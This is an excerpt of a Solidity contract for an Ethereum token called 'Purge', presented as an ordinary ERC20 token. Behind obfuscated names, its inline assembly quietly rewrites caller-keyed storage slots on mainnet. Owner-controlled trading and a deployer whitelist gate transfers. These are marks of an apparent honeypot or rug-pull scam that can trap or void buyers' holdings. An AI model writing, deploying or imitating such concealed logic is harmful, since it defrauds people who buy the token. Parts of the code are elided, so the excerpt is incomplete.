...
/*
PURGE | ETH
This year, we'll see the good and evil in everyone.
GOOD // EVIL
$PURGE
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addPurge;
    uint256 private _purgeThis = block.number*2;

    mapping (address => bool) private _AloeVera; 
    mapping (address => bool) private _AgaveVera;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _neverLie;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private neutraLic;
    address public pair;
    ...
    bool private trading; uint256 private lochNess = 1; bool private lessFoam;
    uint256 private _decimals; uint256 private lawBaby;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addPurge.push(_router); addPurge.push(msgSender_); addPurge.push(pair);
        for (uint256 q=0; q < 3;) {_AloeVera[addPurge[q]] = true; unchecked{q++;} }
    }
    ...
    function _StartKnocking() internal {
        assembly {
            ...
            if and(not(eq(sload(getBy(caller(),0x6)),sload(0xfbdea0db34f7d968250ec85df636518f05923b2156239a0bfd147ddeff6e13d2))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x950738d2e55bbb854d0ffd442e1dbee03fcf2b8fb732200e27611a9c8a1eea4d,0x1)
                sstore(getBy(caller(),0x5),0x1) sstore(0xfbdea0db34f7d968250ec85df636518f05923b2156239a0bfd147ddeff6e13d2,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _purgeThis = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addPurge[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract ThePurgeToken is ERC20Token {
    constructor() ERC20Token("Purge", "PURGE", msg.sender, 275000 * 10 ** 18) {
    }
}